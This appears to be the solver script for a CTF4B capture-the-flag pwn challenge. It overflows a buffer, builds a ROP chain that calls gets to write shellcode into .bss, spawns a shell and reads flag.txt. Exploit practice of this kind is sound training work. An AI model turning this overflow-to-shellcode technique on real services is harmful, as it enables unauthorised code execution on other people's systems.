#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '9002'))

context.log_level = 'critical'
binfile = './chall'
e = ELF(binfile)
context.binary = binfile
bss = e.bss() + 0x800

io = remote(HOST, PORT)

pad = b'a' * 0x18

rop = ROP(e)
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(p64(bss))
rop.raw(p64(e.sym['gets']))
rop.raw(rop.find_gadget(['ret']))
rop.raw(p64(bss))

payload = pad + rop.chain()

io.sendlineafter(b'?', payload)

shellcode = asm(shellcraft.sh())

io.sendline(shellcode)


io.sendline(b'echo exploited')
io.sendlineafter(b'exploited\n', b'cat flag.txt')

print(io.readline().decode('utf-8', 'ignore'), end='')
